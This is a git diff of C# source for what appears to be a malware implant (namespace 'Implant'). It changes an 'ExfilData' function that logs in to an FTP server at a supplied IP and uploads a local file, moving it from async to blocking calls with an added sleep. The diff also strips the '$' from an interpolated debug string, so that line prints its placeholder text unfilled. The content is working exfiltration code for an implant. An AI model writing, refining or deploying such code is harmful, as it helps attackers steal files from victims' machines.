@@ -1,5 +1,5 @@
 using System.Net;
-using System.Net.Http;
+// using System.Net.Http;
 using System.Net.NetworkInformation;
 using System;
 using System.IO;
@@ -22,7 +22,7 @@ namespace Implant
 
 
         // FTP Connection, uploading file at location file_loc
-        static async void ExfilData(string ip, string user, string pass, string file_loc)
+        static void ExfilData(string ip, string user, string pass, string file_loc)
         {
           try{
             FtpWebRequest request = (FtpWebRequest)WebRequest.Create("ftp://" + ip);
@@ -36,10 +36,11 @@ namespace Implant
             {
               using (Stream requestStream = request.GetRequestStream())
               {
-                await fs.CopyToAsync(requestStream);
+                fs.CopyTo(requestStream);
+                System.Threading.Thread.Sleep(2000);
                 using (FtpWebResponse response = (FtpWebResponse)request.GetResponse())
                 {
-                  Console.WriteLine($"DEBUG: Upload Complete, status {response.StatusDescription}");
+                  Console.WriteLine("DEBUG: Upload Complete, status {response.StatusDescription}");
                 }
               }
             }
